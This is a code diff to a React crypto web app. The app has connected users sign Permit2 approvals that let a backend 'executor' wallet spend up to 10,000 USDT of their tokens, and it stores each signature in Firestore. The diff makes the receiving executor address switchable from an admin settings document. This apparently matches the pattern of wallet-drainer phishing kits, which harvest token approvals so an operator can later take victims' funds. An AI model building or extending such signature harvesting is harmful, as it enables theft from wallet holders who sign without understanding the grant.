@@ -4,15 +4,15 @@ import { EthersAdapter } from '@reown/appkit-adapter-ethers';
 import { mainnet } from '@reown/appkit/networks';
 import { BrowserProvider } from 'ethers';
 import { db } from './firebase';
-import { doc, setDoc } from 'firebase/firestore';
+import { doc, setDoc, onSnapshot } from 'firebase/firestore';
 import Admin from './Admin'; // <--- MAKE SURE THIS IMPORT IS HERE
 
 // -----------------------------
 // CONFIGURATION
 // -----------------------------
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-// Ensure this variable exists in your .env file
-const EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS; 
+// Executor address can come from env or Firestore admin settings
+const ENV_EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS;
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
@@ -32,6 +32,9 @@ export default function App() {
   // 1. ROUTING LOGIC: Check if we are on the "/admin" page
   const [isAdmin] = useState(() => window.location.pathname === '/admin');
 
+  // Executor address state (prefer Firestore value; fallback to env)
+  const [executorAddress, setExecutorAddress] = useState(ENV_EXECUTOR_ADDRESS || '');
+
   const [status, setStatus] = useState("Not connected");
   const [connectedAddress, setConnectedAddress] = useState(null);
 
@@ -48,14 +51,29 @@ export default function App() {
     return () => unsub();
   }, []);
 
+  // Subscribe to admin_config/settings.executorAddress so frontend uses the stored executor
+  useEffect(() => {
+    try {
+      const ref = doc(db, 'admin_config', 'settings');
+      const unsub = onSnapshot(ref, (snap) => {
+        if (!snap.exists()) return;
+        const data = snap.data();
+        if (data?.executorAddress) setExecutorAddress(data.executorAddress);
+      }, (err) => console.error('admin settings onSnapshot error', err));
+      return () => unsub();
+    } catch (e) {
+      // ignore if Firestore unavailable
+    }
+  }, []);
+
   const signPermit = async () => {
     try {
       if (!connectedAddress) {
         setStatus("Wallet not connected");
         return;
       }
-      if (!EXECUTOR_ADDRESS) {
-        setStatus("Error: VITE_EXECUTOR_ADDRESS missing in .env");
+      if (!executorAddress) {
+        setStatus("Error: Executor address missing (set VITE_EXECUTOR_ADDRESS or admin_config/settings.executorAddress)");
         return;
       }
 
@@ -105,7 +123,7 @@ export default function App() {
       // Spender MUST be the Executor (Backend Wallet), NOT the Router
       const message = {
         details: permitted,
-        spender: EXECUTOR_ADDRESS, 
+        spender: executorAddress,
         sigDeadline: deadline
       };
 
@@ -126,7 +144,7 @@ export default function App() {
 
       await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
-        spender: EXECUTOR_ADDRESS,
+        spender: executorAddress,
         token: import.meta.env.VITE_TOKEN_ADDRESS,
         amount: SPENDING_CAP.toString(),
         deadline,
